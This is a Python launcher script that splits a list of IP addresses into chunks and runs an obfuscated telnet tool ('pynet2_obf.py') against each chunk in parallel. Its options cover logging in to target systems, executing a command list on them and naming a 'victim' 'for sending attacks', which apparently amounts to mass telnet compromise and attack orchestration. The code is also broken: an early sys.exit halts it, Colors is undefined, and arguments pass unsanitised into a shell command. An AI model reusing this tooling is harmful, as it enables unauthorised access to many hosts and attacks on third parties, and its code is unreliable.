#!/usr/bin/env python3

# This script splits a large bulk of xmls
# for processing it in parallel

import os
import sys
import signal
import argparse
import multiprocessing
from multiprocessing import Process

# Global list
processes = []
splitted_files = []
number_processes = 8    # default value
pynet2_executable = os.getcwd() + "/pynet2_obf.py"

def exit_gracefully():
    print("\n\n[!] Exiting gracefully...")

    # Terminate all processes
    for p in processes:
        p.terminate()
    for p in processes:
        p.join()

    # Clear the global list of processes
    processes.clear()

    sys.exit(0)


# Signal handler function to catch Ctrl+C
def signal_handler(sig, frame):
    exit_gracefully()


# Register the signal handler for SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)


# Function to parse command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="PyNet - A Python-based tool for telnet and network operations.")
    parser.add_argument("-iL", "--ip_list", help="\t\tPath to a file containing a list of IP addresses or hostnames, one per line.")
    parser.add_argument("-iC", "--commands_list", help="\t\tPath to a file containing a list of telnet commands to execute, one per line.")
    parser.add_argument("-n", "--processes", help="\t\tNumber of processes.")
    parser.add_argument("-i", "--ip", help="\t\tTarget IP address or hostname to authenticate with.")
    parser.add_argument("-p", "--port", default=23, type=int, help="\t\tTarget port (default is 23 for Telnet).")
    parser.add_argument("-l", "--login", action="store_true", help="\tSimply login on the target system.")
    parser.add_argument("-v", "--victim", help="\tTarget victim for sending attacks (IP or domain name).")
    parser.add_argument("-c", "--command", help="\tCommand to execute on the target system.")

    return parser.parse_args()


# Method for splitting a file
def split_file(input_path, number):

    with open(input_path) as file:
        ip_addresses = file.read().splitlines()

        total_lines = len(ip_addresses)
        chunk_size = int(total_lines / number)

        cont = 0
        cont_less = 1
        buffer = list()
        for ip in ip_addresses:

            # Refresh variables when chunk size is encountered
            if cont == chunk_size:

                out_path = input_path + f".{cont_less}"
                splitted_files.append(out_path)
                print(f"[!] Splitted: {out_path}     {len(buffer)}")

                #write the buffer into a file
                with open(out_path, 'w') as buffer_file:
                    buffered_string = '\n'.join(buffer)
                    buffer_file.write(buffered_string)

                # Update variables
                cont_less += 1
                cont = 0
                buffer = []
            else:
                buffer.append(ip)
                cont += 1
                #print(ip)

        # Last buffered when not reach chunk_size
        out_path = input_path + f".{cont_less}"
        splitted_files.append(out_path)
        print(f"[!] Splitted: {out_path}     {len(buffer)}")

        #write the buffer into a file
        with open(out_path, 'w') as buffer_file:
            buffered_string = '\n'.join(buffer)
            buffer_file.write(buffered_string)

    file.close()



# Call a single pynet
def call_pynet(ip_file, port, victim, sequence_path):
    global pynet2_executable
    #os.system(f"python {pynet2_executable} -iL {ip_file} -p {port} -l -v {victim}")
    os.system(f"python {pynet2_executable} -iL {ip_file} -p {port} -l -v {victim} -iC {sequence_path}")


# Call the multiprocessing method for parallelizing
def main():

    global number_processes, splitted_files, pynet2_executable

    # Parse command-line arguments
    args = parse_arguments()

    print(f"{pynet2_executable}")

    sys.exit(0)

    # Update the number of processes created.
    if args.processes:
        number_processes = int(args.processes)

    # Check path exist
    if not os.path.exists(args.ip_list):
        print(f"[!] Path doesn't exist:  {args.ip_list}")
        sys.exit(0)

    if not os.path.exists(args.commands_list):
        print(f"[!] Path doesn't exist:  {args.commands_list}")
        sys.exit(0)

    # Split provided file
    split_file(args.ip_list, number_processes)

    print()
    for ip_file in splitted_files:
        p = Process(target=call_pynet, args=(ip_file, args.port, args.victim, args.commands_list))
        processes.append(p)
        p.start()

    print(Colors.GREEN + f"\n[!] Command executes on {ip_file} begins with {number_processes} processes" + Colors.R)

    # Wait for all processes to complete
    for p in processes:
        p.join()



if __name__ == "__main__":

    main()
